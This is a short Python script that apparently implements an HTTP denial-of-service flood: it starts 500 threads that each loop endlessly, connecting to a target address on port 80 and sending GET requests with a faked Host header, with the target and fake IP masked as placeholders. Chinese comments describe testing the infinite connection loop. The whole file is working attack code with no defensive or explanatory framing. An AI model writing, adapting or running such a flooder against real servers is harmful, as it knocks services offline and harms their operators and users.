import threading
import socket

target = 'XXX.XXX.X.X'
port = 80
fack_ip = '182.XX.20.32'

already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
                 (target, port))
        s.sendto(("Host:" + fack_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        # 測試 無限循環連接
        # global already_connected
        # already_connected += 1
        # print(already_connected)

        # if already_connected % 500 == 0:
        #     print(already_connected)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
